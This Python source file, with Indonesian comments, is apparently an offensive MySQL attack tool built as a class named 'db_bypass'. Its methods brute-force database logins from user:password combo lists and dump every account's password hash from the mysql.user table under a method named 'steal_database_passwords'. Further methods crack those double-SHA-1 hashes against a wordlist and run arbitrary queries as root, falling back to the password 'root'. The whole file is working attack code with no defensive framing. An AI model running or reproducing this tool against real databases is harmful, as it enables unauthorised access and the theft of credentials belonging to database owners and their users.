import subprocess
import os
import hashlib

class db_bypass:
    # ==============================================================
    # 1. ADVANCED BRUTE FORCE (MENGGUNAKAN FORMAT AKUN:PASSWORD)
    # ==============================================================
    # TARGET YANG DI INCAR MEMILIKI 3 SYARAT YG DI PERLUKAN [SELECT mysql.*, SUPER, FILE]
    def brute_force_accounts(self, combo_file):
        try:
            if not os.path.exists(combo_file):
                return None

            with open(combo_file, 'r') as f:
                for line in f:
                    # MENGURAI FORMAT nama_akun:password
                    if ":" not in line: continue
                    user, pwd = line.strip().split(":", 1)
                    print(f"[DEBUG BRUTE FORCE] User={user} : password={pwd}")
                    
                    # PERCOBAAN LOGIN SILENT
                    command = ["mysql", "-u", user, f"-p{pwd}", "-e", "select 1"]
                    try:
                        subprocess.check_output(command, stderr=subprocess.STDOUT, timeout=2)
                        # JIKA BERHASIL, KEMBALIKAN PASANGAN AKUN & PWD
                        return {"user": user, "password": pwd}
                    except subprocess.CalledProcessError:
                        continue
            return None
        except Exception as e:
            return None

    # ==============================================================
    # 2. STEAL DB PASSWORD (MENCURI HASH PASSWORD DARI DATABASE INTERNAL)
    # ==============================================================
    def steal_database_passwords(self, user, password):
        try:
            # QUERY UNTUK MENGGABUNGKAN DATA USER DAN HASH PASSWORD AGAR MUDAH DIBACA
            query = "SELECT CONCAT(User, '@', Host, ' -> ', Authentication_string) FROM mysql.user;"
            
            # MENGGUNAKAN -N DAN -s AGAR OUTPUT BERSIH TANPA FRAME TABEL
            command = ["mysql", "-u", user, f"-p{password}", "-N", "-s", "-e", query]
            
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, timeout=5)
            content = output.decode(errors="ignore")
            
            if not content or "NULL" in content:
                return "[!] DATA KOSONG ATAU USER TIDAK MEMILIKI HAK AKSES KE TABEL SYSTEM."
            return content
        except Exception as e:
            return f"[!] GAGAL MENCURI PASSWORD DATABASE: {str(e)}"

    # ==============================================================
    # 3. LOCAL HASH CRACKER (UNICODE / MYSQL_NATIVE_PASSWORD)
    # ==============================================================
    def crack_mysql_hash(self, target_hash, wordlist_file):
        try:
            if not os.path.exists(wordlist_file):
                return "[!] ERROR: File wordlist tidak ditemukan."

            clean_hash = target_hash.replace("*", "").strip().lower()

            with open(wordlist_file, 'r', errors='ignore') as f:
                for line in f:
                    raw_line = line.strip()
                    if not raw_line: continue
                    
                    # TOLERANSI FORMAT: JIKA FILE ADALAH COMBO (USER:PASSWORD)
                    # KITA AMBIL BAGIAN PASSWORD-NYA SAJA
                    if ":" in raw_line:
                        _, candidate = raw_line.split(":", 1)
                    else:
                        candidate = raw_line
                    
                    candidate = candidate.strip()
                    
                    # PROSES DOUBLE SHA-1
                    first_sha1 = hashlib.sha1(candidate.encode('utf-8')).digest()
                    second_sha1 = hashlib.sha1(first_sha1).hexdigest().lower()

                    if second_sha1 == clean_hash:
                        return candidate
                        
            return None
        except Exception as e:
            return f"[!] ERROR CRACKING: {str(e).upper()}"
        
    # ==============================================================
    # 4. DYNAMIC QUERY EXECUTION (BISA PILIH AKUN ATAU ROOT)
    # ==============================================================
    def execute_custom_query(self, query, user="root", password=None):
        try:
            # 1. NORMALISASI STRING QUERY (SATUKAN KEMBALI JIKA TERPECAH MENJADI LIST)
            if isinstance(query, list):
                query = " ".join(query)
            
            # BERSIHKAN HANYA SPASI KOSONG DI AWAL DAN AKHIR STRING (JANGAN PAKAI STRIP PETIK)
            query = query.strip()
            
            # HILANGKAN TANDA TITIK KOMA (;) DI AKHIR QUERY JIKA ADA, 
            # KARENA ARGUMEN MYSQL -E OTOMATIS MENAMBAHKANNYA DI LATAR BELAKANG
            if query.endswith(";"):
                query = query[:-1]

            # 2. LOGIKA PENYUSUNAN ARGUMEN CLI MYSQL / MARIADB YANG KETAT
            command = ["mysql", "-u", user]
            
            # JIKA PASSWORD BERUPA STRING KOSONG, NONE, ATAU STRING "NONE" DARI TERMINAL
            if password and str(password).lower() != "none" and str(password).strip() != "":
                command.append(f"-p{password}")
            else:
                # MENAMBAHKAN FLAG -PROOT SECARA EKSPLISIT JIKA USER ADALAH ROOT TANPA SANDI TAMBAHAN
                # ATAU BIARKAN KOSONG TANPA -P JIKA MENGGUNAKAN AUTH_SOCKET LOCAL
                if user == "root":
                    command.append("-proot") 

            # MASUKKAN QUERY EKSEKUSI
            command.extend(["-e", query])

            # 3. EKSEKUSI PERINTAH SUBPROSES
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, timeout=10)
            
            if output:
                return output.decode(errors="ignore")
            return "[+] QUERY BERHASIL DIEKSEKUSI TANPA ERROR"
            
        except subprocess.CalledProcessError as e:
            # MENGEMBALIKAN DETAIL ERROR DARI ENGINE MYSQL SECARA SPESIFIK
            error_msg = e.output.decode(errors="ignore") if e.output else str(e)
            return f"[!] EKSEKUSI GAGAL (MySQL Error):\n{error_msg}"
        except Exception as e:
            return f"[!] EKSEKUSI GAGAL (Sistem Error): {str(e)}"